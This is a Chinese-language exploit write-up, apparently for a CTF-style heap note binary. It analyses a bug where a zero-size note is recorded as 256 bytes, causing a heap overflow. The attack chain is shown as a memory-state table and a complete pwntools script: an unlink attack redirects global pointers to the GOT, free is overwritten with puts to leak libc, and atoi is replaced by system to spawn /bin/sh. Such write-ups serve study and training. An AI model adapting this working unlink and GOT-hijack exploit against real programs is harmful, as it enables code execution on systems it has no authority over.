# 漏洞利用文档

## 执行环境
基于反编译代码和exp分析，程序的执行环境如下：
- **二进制类型**：64位ELF程序，使用x86-64架构
- **保护机制**：
  - **Canary**：已启用（反编译代码中可见`__readfsqword(0x28u)`栈保护）
  - **NX**：可能启用（代码段不可执行，依赖ROP/GOT覆盖）
  - **PIE**：未启用（全局变量地址固定，如`ptr=0x6020C8`）
  - **RELRO**：Partial RELRO（GOT表可写，允许GOT hijacking）
- **依赖库**：使用libc（通过ldd确认），exp中通过`elf.libc`获取版本
- **运行要求**：Linux环境，需要堆内存分配权限，无特殊依赖

## 漏洞成因
### 关键结构体分析
程序使用以下全局变量管理堆笔记：
- `ptr`数组（0x6020C8）：存储7个堆指针（每个8字节），指向笔记内容
- `qword_6020C0`数组（0x6020C0）：混合存储全局指针和笔记大小
  - `qword_6020C0[0]`：指向最新笔记的全局指针
  - `qword_6020C0[i+8]`：存储第i个笔记的大小（i=0-6）

### 漏洞分析
**漏洞类型**：堆溢出（Heap Overflow）结合Use-After-Free（UAF）

**根本原因**：
1. **大小存储错误**：在`new`操作中，当分配size=0的笔记时（如`new(b'0', b'aaaa')`），程序错误地将大小存储为256（0x100）而非0（见调试记录Step 1中`qword_6020C0[8] = 0x100`）。
2. **编辑时溢出**：在`edit`操作中（`sub_400C0D`），使用存储的大小（`qword_6020C0[v3 + 8]`）调用`sub_4008DD`进行写入。对于索引0，存储大小为256，但实际分配仅32字节用户数据（chunk大小0x21），导致堆溢出。
3. **Unlink利用**：通过溢出伪造相邻chunk的元数据（fd/bk指针），在free时触发unlink操作，修改全局变量。

**漏洞触发路径**：
```
edit(0) -> 使用错误大小256 -> sub_4008DD写入256字节 -> 溢出chunk 0边界 -> 覆盖chunk 1/2元数据
```

## 漏洞利用过程
### 内存变化关键步骤
| 步骤 | 操作 | 堆内存变化 | 全局变量变化 | GOT表变化 | 利用状态 |
|------|------|------------|-------------|-----------|----------|
| 1 | `new(0, "aaaa")`等 | 分配4个chunk：chunk0(0x21), chunk1(0x111), chunk2(0x111), chunk3(0x111) | `ptr[0-3]`指向堆地址，`qword_6020C0[8]=0x100`（错误） | 无变化 | 初始堆布局 |
| 2 | `edit(0, payload)` | 溢出chunk0：覆盖chunk1 size为0x121，chunk2设置fd=0x6020C0, bk=0x6020C8 | 无变化 | 无变化 | 伪造unlink条件 |
| 3 | `delete(1)` | chunk1进入unsorted bin；unlink触发：`*(fd+0x18)=bk`, `*(bk+0x10)=fd` | `ptr[2]=0x6020C0`, `qword_6020C0[3]=0x6020C0` | 无变化 | Unlink攻击成功 |
| 4 | `edit(2, payload)` | 无直接堆变化 | `ptr[0]=free_got`, `ptr[1-3]=atoi_got`, `qword_6020C0[0-2]=GOT地址` | 无变化 | 全局变量指向GOT |
| 5 | `edit(0, puts_plt)` | 无直接堆变化 | 无变化 | `free_got=puts_plt` | GOT hijacking |
| 6 | `delete(2)` | 触发`puts(atoi_got)`泄露libc地址 | 无变化 | 无变化 | Libc基址泄露 |
| 7 | `edit(3, system)` | 无直接堆变化 | 无变化 | `atoi_got=system` | 系统函数劫持 |
| 8-9 | 输入`/bin/sh` | 进程替换为`/bin/dash` | 内存被shell重用 | GOT表失效 | Shell获取 |

### 堆布局演变
```
初始: [chunk0:32B][chunk1:256B][chunk2:256B][chunk3:256B][top]
溢出后: [chunk0:伪造元数据][chunk1:size=0x121][chunk2:fd/bk=全局变量][chunk3:修改prev_size]
释放后: [chunk0][chunk1:unsorted_bin][chunk2][chunk3]
Unlink后: 全局变量指向GOT，堆布局保持不变但元数据损坏
```

## Exploit
```python
from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
p = process('./data/sample16')
elf = ELF('./data/sample16')
libc = elf.libc
ptr = 0x6020C8
free_got = elf.got['free']
atoi_got = elf.got['atoi']
puts_plt = elf.plt['puts']

def new(size, content):
    p.recvuntil(b'>>\n')
    p.sendline(b'1')
    p.recvuntil(b'1024)\n')
    p.sendline(size)
    p.recvuntil(b'content:\n')
    p.sendline(content)

def show():
    p.recvuntil(b'>>\n')
    p.sendline(b'2')

def edit(idx, content):
    p.recvuntil(b'>>\n')
    p.sendline(b'3')
    p.recvuntil(b'note:\n')
    p.sendline(idx)
    p.recvuntil(b'content:\n')
    p.sendline(content)

def delete(idx):
    p.recvuntil(b'>>\n')
    p.sendline(b'4')
    p.recvuntil(b'note:\n')
    p.sendline(idx)

# Step 1: 分配初始堆块，chunk0大小0用于后续溢出
new(b'0', b'aaaa');new(b'256', b'aaaa');new(b'256', b'aaaa');new(b'256', b'aaaa')#step.1

# Step 2: 构造溢出payload，伪造堆元数据准备unlink攻击
# fd/bk指向全局变量区，伪造chunk2的fd/bk以在unlink时修改全局变量
fd = ptr + 0x10 - 0x18  # 指向qword_6020C0[0] 
bk = ptr + 0x10 - 0x10  # 指向ptr[0]
payload = p64(0) * 3 + p64(0x121) + b'a' * 0x110 + p64(0) + p64(0x101) + p64(fd) + p64(bk) + b'a' * (0x100-0x20) + p64(0x100) + p64(0x110)
edit(b'0', payload)#step.2

# Step 3: 释放chunk1触发unlink，修改全局变量指向GOT
delete(b'1')#step.3

# Step 4: 通过编辑chunk2修改全局变量，使其指向GOT表
payload = b'a' * 0x8 + p64(free_got) + p64(atoi_got) + p64(atoi_got) + p64(atoi_got)
edit(b'2', payload)#step.4

# Step 5: 覆盖free@got为puts@plt，用于泄露libc地址
edit(b'0', p64(puts_plt)[:-1])#step.5  # 写入7字节，小端序有效

# Step 6: 触发free(chunk2)实际调用puts(atoi_got)，泄露atoi地址
delete(b'2')
atoi_addr = u64(p.recvline()[:-1].ljust(8, b'\x00'))#step.6

# Step 7: 计算libc基址和system地址，覆盖atoi@got为system
libc_addr = atoi_addr - libc.symbols['atoi']
system_addr = libc.symbols['system'] + libc_addr
edit(b'3', p64(system_addr)[:-1])#step.7

# Step 8-9: 输入"/bin/sh"触发atoi调用，实际执行system("/bin/sh")
p.recvuntil(b'>>\n')#step.8
p.sendline(b'/bin/sh')#step.9
p.interactive()
```

### 关键注释说明
- **unlink攻击**：通过伪造fd/bk指针，在free时触发unlink操作，实现任意地址写入
- **GOT覆盖**：利用全局变量指向GOT的特性，通过edit操作修改GOT表条目
- **Libc泄露**：通过覆盖free为puts，泄露atoi的libc地址，计算system地址
- **函数劫持**：最终将atoi替换为system，实现命令执行

此漏洞利用成功绕过了堆保护机制，通过堆溢出和unlink攻击实现了任意代码执行。
